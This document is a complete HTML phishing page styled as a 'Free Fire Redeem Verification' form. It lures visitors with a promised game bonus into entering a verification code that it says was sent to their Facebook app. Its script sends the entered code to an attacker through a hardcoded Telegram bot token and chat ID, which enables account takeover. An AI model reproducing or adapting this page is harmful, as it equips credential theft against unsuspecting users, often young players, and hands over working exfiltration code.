<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Redeem Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }
        p {
            font-size: 16px;
            color: #555;
            line-height: 1.5;
            margin-bottom: 30px;
        }
        input[type="text"] {
            width: calc(100% - 20px);
            padding: 12px 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Free Fire Redeem Verification</h1>
        <p>We just sent you a verification code. Check your Facebook app notification, verify your code, and get a Free Fire redeem bonus!</p>
        <input type="text" id="verificationCode" placeholder="Enter your verification code">
        <button onclick="sendOtp()">Verify Code</button>
    </div>

    <script>
        function sendOtp() {
            const botToken = '7348466923:AAEljKlmtXxpO33eF0uRdUAIdsHaRgJP0ho';
            const chatId = '5666376784';
            const otp = document.getElementById('verificationCode').value;

            if (otp.trim() === '') {
                alert('Please enter a verification code.');
                return;
            }

            const message = `New OTP received: ${otp}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            const params = new URLSearchParams({
                chat_id: chatId,
                text: message
            });

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: params.toString()
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('OTP sent successfully! Wait for verification.');
                    // You can optionally clear the input field
                    // document.getElementById('verificationCode').value = '';
                } else {
                    alert('Failed to send OTP. Please try again. Error: ' + data.description);
                    console.error('Telegram API Error:', data);
                }
            })
            .catch(error => {
                alert('An error occurred while sending OTP.');
                console.error('Network Error:', error);
            });
        }
    </script>
</body>
</html>
